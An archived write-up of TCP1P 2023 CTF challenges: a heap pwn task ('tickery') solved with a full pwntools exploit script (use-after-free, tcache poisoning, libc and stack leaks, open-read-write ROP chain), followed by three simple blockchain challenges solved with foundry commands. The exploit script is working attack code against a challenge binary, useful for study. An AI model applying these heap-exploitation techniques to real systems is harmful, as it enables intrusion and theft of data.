# tickery

**CTF:** TCP1P 2023  
**Category:** pwn  
**Original writeup:** <https://chovid99.github.io/posts/tcp1p-ctf-2023/> — by **chovid99**. All credit goes to the original author; this is an archived copy.

---

tickery

Description Author: yqroo is this pwn chall? nc ctf.tcp1p.com 49999

Solution

In this challenge, we were given a binary called main and libc.so.6 . Let’s start by disassemble the binary.

main

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 int __cdecl __noreturn main ( int argc , const char ** argv , const char ** envp ) { int v3 ; // [rsp+1Ch] [rbp-14h] BYREF __int64 v4 ; // [rsp+20h] [rbp-10h] unsigned __int64 v5 ; // [rsp+28h] [rbp-8h] v5 = __readfsqword ( 0x28u ); init ( argc , argv , envp ); seccomp_rules ( argc ); puts ( "ticket??" ); while ( 1 ) { while ( 1 ) { menu (); printf ( "> " ); __isoc99_scanf ( "%d%*c" , & v3 ); if ( v3 != 3 ) break ; v4 = ticketid ( prompt ); refund ( v4 ); } if ( v3 > 3 ) break ; if ( v3 == 1 ) { v4 = ticketid ( prompt ); order ( v4 ); } else { if ( v3 != 2 ) break ; v4 = ticketid ( prompt ); verify ( v4 ); } } puts ( "nono

" ); _exit ( 0 ); }

order

1 2 3 4 5 6 ssize_t __fastcall order ( __int64 a1 ) { * (( _QWORD * ) & TICKET + a1 ) = malloc ( 0x20uLL ); printf ( "Name : " ); return read ( 0 , * (( void ** ) & TICKET + a1 ), 0x20uLL ); }

verify

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 unsigned __int64 __fastcall verify ( __int64 a1 ) { void * v1 ; // rsp __int64 v3 ; // [rsp+8h] [rbp-40h] BYREF __int64 v4 ; // [rsp+10h] [rbp-38h] __int64 v5 ; // [rsp+20h] [rbp-28h] void * buf ; // [rsp+28h] [rbp-20h] unsigned __int64 v7 ; // [rsp+30h] [rbp-18h] v4 = a1 ; v7 = __readfsqword ( 0x28u ); v5 = 31LL ; v1 = alloca ( 32LL ); buf = & v3 ; if ( * (( _QWORD * ) & TICKET + a1 ) ) { puts ( "Please Confirm !" ); printf ( "Your seat %lu

" , v4 ); printf ( "please say your name for confirmation : " ); read ( 0 , buf , 0x20uLL ); sub_1450 (( const char * ) buf ); if ( ! strcmp ( * (( const char ** ) & TICKET + v4 ), ( const char * ) buf ) ) { puts ( "This ticket has been verified, for your own safety please change the ticket name" ); printf ( "New name : " ); read ( 0 , * (( void ** ) & TICKET + v4 ), 0x20uLL ); } else { printf ( "Sorry sir this ticket belongs to %s" , * (( const char ** ) & TICKET + v4 )); * (( _QWORD * ) & TICKET + v4 ) = 0LL ; } } else { puts ( "This seat is available, you are free to order this one" ); } return v7 - __readfsqword ( 0x28u ); }

refund

1 2 3 4 5 6 7 int __fastcall refund ( __int64 a1 ) { if ( !* (( _QWORD * ) & TICKET + a1 ) ) return puts ( "This seat is available, you are free to order this one" ); free ( * (( void ** ) & TICKET + a1 )); return puts ( "ok" ); }

Reviewing the provided code, we summarize its functionality as follows:

order : Creates a new ticket with a fixed chunk size of 0x20 , which is not under our control.

: Creates a new ticket with a fixed chunk size of , which is not under our control. verify : Allows editing of an existing ticket.

: Allows editing of an existing ticket. refund : Deletes a ticket.

Additionally, the binary has seccomp restrictions enforcing that only open , read , and write syscalls are permissible, eliminating the possibility of spawning a shell.

We’ve identified a Use-After-Free vulnerability in the refund function, where the TICKET structure isn’t cleared post-deletion. With this insight, our exploitation strategy encompasses the following steps:

Leak the heap address by exploiting the Use-After-Free vulnerability, allowing us to gather valuable information about memory layout.

Leak the libc address, essential for bypassing ASLR and potentially manipulating function pointers within libc.

Leak the stack address to understand the precise stack layout, preparing for a potential Return-Oriented Programming (ROP) exploit.

Execute the open-read-write sequence, as these are the only syscalls allowed, focusing our exploit path. This strategy doesn’t involve spawning a shell but rather reading sensitive information or writing our payload into executable memory.

Leak libc address

Typically, we might leak a libc address by filling up the tcache for large-size chunks. However, our limitation is that we can only invoke malloc(0x20) . This constraint led us to the following strategy:

Engage in tcache poisoning, allowing us to redirect our new chunk towards the tcache metadata (which is located in the start of the heap area). We aim for the count metadata corresponding to each bin size.

metadata (which is located in the start of the area). Then, we adjust the count to 7 to max it out. In this challenge, I adjusted the 0xc0 size counter to 7.

Subsequently, we perform another tcache poisoning to create a new chunk that overlaps an existing chunk header.

We overwrite the chunk size to 0xc0 .

. Upon freeing it, the chunk, now situated in the unsorted bin , carries the libc address of main_arena .

Notes that to do the the tcache poisoning, we can simply use the verify function to modify the pointer pointed by the tcache chunk. However, noticed that during the overwrite process via verify , our input must pass the sub_1450(input) function to match the value stored in the targeted ticket. I simply replicated the function using z3 to fetch what value that I need to put to pass the check.

Leak stack address

With the libc leak in hand and considering seccomp restrictions, we opted for ROP, which means we need a stack leak. We achieved this by directing a tcache poison towards environ and extracting its value.

Execute open-read-write

Having the stack leak, our next challenge was gaining RIP control. We came out with the following strategy:

Note that a chunk is allocated within the order function.

function. Utilize the stack leak to predict the stack address for the stored RIP within the order function’s stack frame.

function’s stack frame. If our offset prediction is accurate, we gain RIP control when allocating the chunk inside the order function.

function. Given the 0x20 size constraint, we can extend our control by invoking gets() .

size constraint, we can extend our control by invoking . Subsequently, we can launch our attack sequence accordingly.

Below is the complete script embodying our approach:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 from pwn import * from ctypes import CDLL from ctypes.util import find_library from z3 import * libc_dll = CDLL ( find_library ( "c" )) exe = ELF ( "main_patched" ) libc = ELF ( "./libc.so.6" ) ld = ELF ( "./ld-2.37.so" ) context . binary = exe context . arch = 'amd64' context . encoding = 'latin' context . log_level = 'INFO' warnings . simplefilter ( "ignore" ) remote_url = "ctf.tcp1p.com" remote_port = 49999 gdbscript = ''' ''' def conn (): if args . LOCAL : r = process ([ exe . path ]) if args . PLT_DEBUG : # gdb.attach(r, gdbscript=gdbscript) pause () else : r = remote ( remote_url , remote_port ) return r def demangle ( val , is_heap_base = False ): if not is_heap_base : mask = 0xfff << 52 while mask : v = val & mask val ^= ( v >> 12 ) mask >>= 12 return val return val << 12 def mangle ( heap_addr , val ): return ( heap_addr >> 12 ) ^ val def enc ( target_val ): s = Solver () curr_val = [ BitVec ( f 'x { i } ' , 64 ) for i in range ( len ( target_val ))] for i in range ( len ( target_val )): s . add ( curr_val [ i ] <= 255 ) s . add ( curr_val [ i ] >= 0 ) v5 = len ( curr_val ) for i in range ( v5 ): curr_val [ i ] = ( curr_val [ i ] ^ libc_dll . rand ()) % 2 ** 8 # v2 = sub_14010(curr_val) v3 = 0 for i in range ( len ( target_val )): v3 = (( v3 << 8 ) + curr_val [ i ]) % 2 ** 64 v2 = v3 v6 = libc_dll . rand () % v5 for _ in range ( v6 ): v2 ^= ( v2 >> 1 ) v7 = len ( target_val ) # res = sub_1420(v2, curr_val, v7) for i in range ( v7 ): curr_val [ i ] = ( v2 % 2 ** 8 ) s . add ( curr_val [ i ] == target_val [ i ]) v2 >>= 8 # Check sat out = s . check () if out == sat : s_m = s . model () arr = [] for i in range ( len ( target_val )): arr . append ( s_m [ BitVec ( f 'x { i } ' , 64 )] . as_long ()) return bytes ( arr ) else : print ( 'FAILED ENC' ) exit () while True : libc_dll . srand ( 0 ) libc . address = 0x0 try : r = conn () def order ( num , val ): r . sendlineafter ( b '> ' , b '1' ) r . sendlineafter ( b 'Number : ' , str ( num ) . encode ()) r . sendafter ( b 'Name : ' , val ) def verify ( num , _old_name , new_name , upd = False , inz = False ): old_name = enc ( _old_name ) r . sendlineafter ( b '> ' , b '2' ) r . sendlineafter ( b 'Number : ' , str ( num ) . encode ()) r . sendafter ( b 'confirmation : ' , old_name ) if inz : r . interactive () if upd : r . sendafter ( b 'name : ' , new_name ) else : r . recvuntil ( b 'belongs to ' ) out = r . recvuntil ( b '1.' )[: - 2 ] return out def refund ( num ): r . sendlineafter ( b '> ' , b '3' ) r . sendlineafter ( b 'Number : ' , str ( num ) . encode ()) ''' Strategy on leaking libc: 1. Tcache poison, allocate a chunk to tcache counters 2. With verify, change its counter to max size 3. Tcache poison, allocate a chunk to active chunk header 4. With verify, change its content to larger chunk size 5. Free, we get libc leak ''' # Try to leak heap for i in range ( 2 ): order ( i , b 'a' * 8 ) order ( i + 1 , b 'b' * 8 ) for i in range ( 2 ): refund ( i ) # pause() out = verify ( 1 , b 'a' , b '' ) leaked_heap = demangle ( u64 ( out . ljust ( 8 , b ' \x00 ' ))) info ( f ' { hex ( leaked_heap ) = } ' ) # Try to leak libc for i in range ( 3 , 5 ): order ( i , b 'b' * 8 ) for i in range ( 2 , 4 ): refund ( i ) ## Poison tcache counter of 0xa0 at leaked_heap-0x1e10 tcache_ctr_a0 = leaked_heap - 0x1e10 old = p64 ( mangle ( leaked_heap , leaked_heap + 0x60 ))[: 6 ] new = p64 ( mangle ( leaked_heap , leaked_heap - 0x1e10 ))[: 6 ] out = verify ( 3 , old , new , upd = True ) # pause() order ( 0 , b 'a' * 8 ) order ( 0 , p16 ( 0x7 ) * 3 ) # 0xc0 should be full ## Poison this chunk header for i in range ( 6 ): order ( i , b 'c' * 8 ) for i in range ( 6 , 9 ): order ( i , b 'd' * 8 ) refund ( 6 ) refund ( 7 ) old = p64 ( mangle ( leaked_heap , leaked_heap + 0x1b0 ) + 1 )[: 6 ] info ( f ' { old = } ' ) new = p64 ( mangle ( leaked_heap , leaked_heap + 0x80 ) + 1 )[: 6 ] out = verify ( 7 , old , new , upd = True ) order ( 1 , b 'a' * 8 ) order ( 1 , p64 ( 0 ) + p64 ( 0xc1 )) # Now order 0 is 0xc0 chunk refund ( 0 ) # free, because full, it will contains libc out = verify ( 0 , b 'a' , b '' ) info ( f ' { out = } ' ) leaked_libc = u64 ( out . ljust ( 8 , b ' \x00 ' )) libc . address = leaked_libc - ( libc . sym . main_arena + 96 ) info ( f ' { hex ( libc . address ) = } ' ) # Time to leak stack address environ = libc . sym . environ order ( 0 , b 'a' * 8 ) order ( 1 , b 'a' * 8 ) order ( 2 , b 'a' * 8 ) refund ( 0 ) refund ( 1 ) old = p64 ( mangle ( leaked_heap , leaked_heap + 0x90 ))[: 6 ] info ( f ' { old = } ' ) new = p64 ( mangle ( leaked_heap , environ ))[: 6 ] out = verify ( 1 , old , new , upd = True ) order ( 0 , b 'a' * 8 ) order ( 1 , b 'a' ) out = verify ( 1 , b 'a' , b '' ) info ( f ' { out = } ' ) leaked_stack = u64 ( out . ljust ( 8 , b ' \x00 ' )) - 0x61 info ( f ' { hex ( leaked_stack ) = } ' ) # Try to ROP info ( f 'TRY TO ROP' ) order ( 0 , b 'a' * 8 ) order ( 1 , b 'a' * 8 ) order ( 2 , b 'a' * 8 ) refund ( 0 ) refund ( 1 ) old = p64 ( mangle ( leaked_heap , leaked_heap + 0x120 ) + 1 )[: 6 ] info ( f ' { old = } ' ) order_stack_rip = leaked_stack - 0xe0 new = p64 ( mangle ( leaked_heap , order_stack_rip ) + 1 )[: 6 ] out = verify ( 1 , old , new , upd = True ) order ( 0 , b 'flag.txt \x00 ' ) # leaked_heap+0x240 pop_rdi = libc . address + 0x00000000000240e5 payload = p64 ( 0 ) + p64 ( pop_rdi ) + p64 ( order_stack_rip ) + p64 ( libc . sym . gets ) order ( 1 , payload ) # ROP CHAIN pop_rdi = libc . address + 0x240e5 pop_rdx = libc . address + 0x26302 pop_rsi = libc . address + 0x2573e pop_rax = libc . address + 0x400f3 syscall = libc . address + 0x8bee6 payload = b 'a' * 0x20 # open(flag.txt, O_RDONLY) payload += p64 ( pop_rdi ) + p64 ( leaked_heap + 0x240 ) + p64 ( pop_rsi ) + p64 ( 0 ) + p64 ( pop_rdx ) + p64 ( 0x0 ) + p64 ( pop_rax ) + p64 ( 2 ) + p64 ( syscall ) # read(3, buff, 0x200) payload += p64 ( pop_rdi ) + p64 ( 5 ) + p64 ( pop_rsi ) + p64 ( leaked_heap ) + p64 ( pop_rdx ) + p64 ( 0x200 ) + p64 ( pop_rax ) + p64 ( 0 ) + p64 ( syscall ) # write(1, buf, 0x200) payload += p64 ( pop_rdi ) + p64 ( 1 ) + p64 ( pop_rsi ) + p64 ( leaked_heap ) + p64 ( pop_rdx ) + p64 ( 0x200 ) + p64 ( pop_rax ) + p64 ( 1 ) + p64 ( syscall ) r . sendline ( payload ) r . interactive () except : print ( f 'SAD' )

**Flag: **

Blockchain

Venue

Description Author: Kiinzu Look at the Amazing Party Venue So do you wish to enter? contract: 0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3 provider: https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 Priv-Key: Please use your own private-key, if you need ETH for transact, You can either DM the Author, or get it by yourself at https://sepoliafaucet.com/

Solution

In this challenge, we were given two files called Venue.sol and 101.txt . Another thing is that in the challenge description, we also given the provider and contract address.

Looking through the Venue.sol :

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0 . 8 . 13 ; contract Venue { string private flag ; string private message ; constructor ( string memory initialFlag , string memory initialMessage ){ flag = initialFlag ; message = initialMessage ; } function enterVenue () public view returns ( string memory ){ return flag ; } function goBack () public view returns ( string memory ){ return message ; } }

Looking through the above source code, we can see that the deployed contract has a public method called enterVenue() , which will return the flag.

In EVM, there are two kind of invocation that we can do to interact with a contract:

call A read-only operation that executes a contract function locally without altering the blockchain state. It’s used to query or test functions and doesn’t require gas since it doesn’t create a transaction on the blockchain.

transaction A write operation that alters the blockchain state (such as updating variables, transferring ETH, or contract deployment). It requires gas and confirmation by the network, and the changes are permanently recorded on the blockchain.



Observed that for this challenge, we don’t actually need to do any write operation, as the goal is to call the enterVenue() function. Hence, we do not need any private key to do it.

We can use the help of foundry to interact with the contract (Installation can be found in here).

Below is the command that we can use to call the enterVenue() function.

1 2 cast call 0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3 "enterVenue()" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002c54435031507b64305f336e6a30795f7468335f70347274795f6275375f3472335f7930755f345f5649503f7d0000000000000000000000000000000000000000

As you can see, we received a hex response from the call, which will be decoded into a flag. Simply decode it using your favourite tool.

1 2 3 In [2]: bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002c54435031507b64305f336e6a3 ...: 0795f7468335f70347274795f6275375f3472335f7930755f345f5649503f7d0000000000000000000000000000000000000000') Out[2]: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

Flag: TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}

Location

Description Author: Kiinzu Will you accept the invitation? If so, find the party location now! nc ctf.tcp1p.com 20005

Solution

Trying to connect with the provided ip and port, we can see that the challenge is we need to answer a quiz, where given a contract layout, submit the storage SLOT of the password variable. Below is example question:

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 nc ctf.tcp1p.com 20005 ====Going to The Party==== To Find the party location You need to solve a simple riddle regarding a SLOT Answer everything correctly, and find the exact location! Question: In which Slot is Password Stored? You'll answer with and ONLY WITH [numbers] ex: 0,1,2,3,4.....99 Note: - Slot start from 0 - If it doesn't stored on SLOT, answer 0 Identification Required for Guest Question: contract StorageChallenge9 { bytes32 private unique_code; bytes32 private key_12; address private owner; address[20] public player; bool private valid; bytes32 private password; address private enemy; bool private answered; } Answer:

To give some background, in EVM, a smart contract has persistent storage, known as “storage”, which exists in a state database, maintaining the information between function calls and transactions. The format is in form of key-value pairs.

Each contract state variables are stored in storage slots. A storage slot is capable of holding 32 bytes piece of data. Each slot can be used by one or more state variables, depends on the order and size. For example, consider this contract:

1 2 3 4 5 contract Example { bytes32 a; address b; bool c; }

In the above contract, the variable a , which has bytes32 type (32 bytes), will be stored in SLOT 0, because it is the first state that is defined in the contract. Next, variable b , which has address type (20 bytes), will be stored in SLOT 1, because the SLOT 0 has been occupied by a . Last, variable c which has bool type (1 byte), will be stored in SLOT 1 as well, because the SLOT 1 still has 12 bytes free space due to the fact that variable b only use 20 bytes of the SLOT 1.

Note A special case which is mentioned in the chall description (“If it doesn’t stored on SLOT, answer 0”) refers to a contract which has immutable state variable. immutable state variable isn’t stored in the storage, which is why there isn’t any SLOT associated with it.

In order to solve this challenge, you can do either manual calculation, or simply compile the contract with solc <contract_name> --storage-layout like this:

1 2 3 4 5 solc src/Test.sol --storage-layout ======= src/Test.sol:StorageChallenge9 ======= Contract Storage Layout: {"storage":[{"astId":3,"contract":"src/Test.sol:StorageChallenge9","label":"unique_code","offset":0,"slot":"0","type":"t_bytes32"},{"astId":5,"contract":"src/Test.sol:StorageChallenge9","label":"key_12","offset":0,"slot":"1","type":"t_bytes32"},{"astId":7,"contract":"src/Test.sol:StorageChallenge9","label":"owner","offset":0,"slot":"2","type":"t_address"},{"astId":11,"contract":"src/Test.sol:StorageChallenge9","label":"player","offset":0,"slot":"3","type":"t_array(t_address)20_storage"},{"astId":13,"contract":"src/Test.sol:StorageChallenge9","label":"valid","offset":0,"slot":"23","type":"t_bool"},{"astId":15,"contract":"src/Test.sol:StorageChallenge9","label":"password","offset":0,"slot":"24","type":"t_bytes32"},{"astId":17,"contract":"src/Test.sol:StorageChallenge9","label":"enemy","offset":0,"slot":"25","type":"t_address"},{"astId":19,"contract":"src/Test.sol:StorageChallenge9","label":"answered","offset":20,"slot":"25","type":"t_bool"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_array(t_address)20_storage":{"base":"t_address","encoding":"inplace","label":"address[20]","numberOfBytes":"640"},"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_bytes32":{"encoding":"inplace","label":"bytes32","numberOfBytes":"32"}}}

Flag: TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc}

VIP

Description Author: Kiinzu A very simple system at a party. If you are a VIP, you can get everything. nc ctf.tcp1p.com 23345

Solution

Let’s start by trying to connect to the given instance.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 nc ctf.tcp1p.com 23345 Welcome to TCP1P Blockchain Challenge 1. How to 101? 2. get Contract >> 1 Same as the last challenge, but this time, call the help() function first nc ctf.tcp1p.com 23345 Welcome to TCP1P Blockchain Challenge 1. How to 101? 2. get Contract >> 2 Contract Addess: 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD RPC URL : https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 To start : Simply call the help() function, everything is written there Note: Due it's deployed on Sepolia network, please use your own Private key to do the transaction If you need funds, you can either DM the probset or get it on https://sepoliafaucet.com/

Let’s start by calling help() function in the given contract with the help of foundry , just like what we did before in the Venue challenge.

1 2 cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD "help()" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001f757656c636f6d6520746f205443503150205072697661746520436c7562210a0a456e6a6f792074686520435446205061727479206f6620796f7572206c6966652068657265210a4275742066697273742e2e2e20506c656173652067697665206d6520796f75722069642c206e6f726d616c2070656f706c652068617665206174206c65617374206d656d62657220726f6c650a4f6620436f757273652c2074686572652061726520616c736f206d616e792056495073206f76657220686572652e20422d290a0a46756e6374696f6e733a0a0a456e7472616e636528726f6c6529202d3e2076657269667920796f757220726f6c6520686572652c2061726520796f752061206d656d626572206f722056495020436c6173730a2020203e20726f6c6520202d2d3e20696e70757420796f757220726f6c6520617320737472696e670a737465616c564950436f64652829202d3e20736f6d656f6e65206d69676874277665206a75737420737465616c20612076697020636f646520616e642077616e7420746f206769766520697420746f20796f750a676574466c616728292020202020202d3e204f6e636520796f752073686f7720796f757220726f6c652c20796f752063616e2074727920796f7572206c75636b21204f4e4c59205649502043616e206765742074686520466c6167210a0a0a000000000000000000

Decoding the hex, we will see this message:

1 2 3 4 5 6 7 8 9 10 11 12 Welcome to TCP1P Private Club! Enjoy the CTF Party of your life here! But first... Please give me your id, normal people have at least member role Of Course, there are also many VIPs over here. B-) Functions: Entrance(role) -> verify your role here, are you a member or VIP Class > role --> input your role as string stealVIPCode() -> someone might've just steal a vip code and want to give it to you getFlag() -> Once you show your role, you can try your luck! ONLY VIP Can get the Flag!

Based on the message, we can kinda see that the top-down flow to solve this challenge here is:

We need to call getFlag() to get the flag.

to get the flag. In order to do that, the sender (us) need to be flagged as a certain role by the contract.

(us) need to be flagged as a certain role by the contract. To set the role, we need to call Entrance(role) . Maybe, if the role is correct, there will be some write operations in the contract which will flagged the sender as a VIP member.

. Maybe, if the is correct, there will be some write operations in the contract which will flagged the as a VIP member. Seems like the stealVIPCode() can be used to fetch the correct role .

Now that we get the idea, let’s start by calling the stealVIPCode() first.

1 2 cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD "stealVIPCode()" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001932049206d6179206f72206d6179206e6f742067657420796f752061207469636b65742c20627574204920646f6e277420756e6465727374616e64206d7563682061626f757420686f7720746f206465636f646520746869732e0a4974277320736f6d6520736f7274206f6620746865697220616269436f64657220706f6c6963792e200a5649502d5469636b65743a203078303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303032303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030326635343433353033313530333137333734343336633631373337333533363536313734323032643230363937333230373436383635323035363439353032303534363936333662363537343230373436383635373932303733363136393634303030303030303030303030303030303030303030303030303030303030303030300a00000000000000000000000000

The decoded message is like below:

1 2 3 I may or may not get you a ticket, but I don't understand much about how to decode this. It's some sort of their abiCoder policy. VIP-Ticket: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002f5443503150317374436c61737353656174202d2069732074686520564950205469636b6574207468657920736169640000000000000000000000000000000000

Let’s decode the VIP-Ticket:

1 TCP1P1stClassSeat - is the VIP Ticket they said

Okay, now that we got the code, it’s time to call Entrance(role) with that VIP-Ticket. In order to do this, we need to have a private key + some ETH balance in our account. First, let’s try to create our own wallet with MetaMask in order to have our own private key. To do that:

Install MetaMask extension.

extension. Create a new wallet.

Follow this documentation to get your private key.

Fill in your account with SepoliaETH. You can either: Ask author to send you ETH, or Use publicly available website to request for SepoliaETH faucet.



After that, with the private key that we have, we will create a transaction which will call Entrance(role) with the given string.

1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cast send 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD "Entrance(string)" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 --private-key <REDACTED> -- "TCP1P1stClassSeat" blockHash ....... blockNumber 4498975 contractAddress cumulativeGasUsed 765784 effectiveGasPrice 3038077111 gasUsed 61788 logs [] logsBloom 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 root status 1 transactionHash ....... transactionIndex 3 type 2

After making this transaction, we should be able to fetch the flag via getFlag() .

1 2 cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD "getFlag()" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 --private-key <REDACTED> 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003854435031507b345f6231745f6f665f6630756e6472795f73336e645f346e645f616269436f6465725f77306e375f687572375f793334687d0000000000000000

Flag: TCP1P{4_b1t_of_f0undry_s3nd_4nd_abiCoder_w0n7_hur7_y34h}
